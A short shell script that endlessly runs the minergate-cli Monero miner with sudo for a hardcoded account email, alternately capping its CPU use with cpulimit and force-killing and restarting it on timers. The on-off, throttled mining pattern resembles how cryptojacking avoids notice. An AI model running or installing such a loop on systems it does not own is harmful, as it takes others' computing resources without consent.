#!/bin/sh
while true
do
sudo cpulimit -e minergate-cli -v -l 100&sleep 10&sudo minergate-cli -user boss.velial@bk.ru -xmr&sleep 60&&sudo killall -9 minergate-cli&&sudo killall -9 cpulimit&sleep 30&sudo cpulimit -e minergate-cli -v -l 120&sleep 10&sudo minergate-cli -user boss.velial@bk.ru -xmr&sleep 120&&sudo killall -9 minergate-cli&&sudo killall -9 cpulimit
sleep 60
done
echo
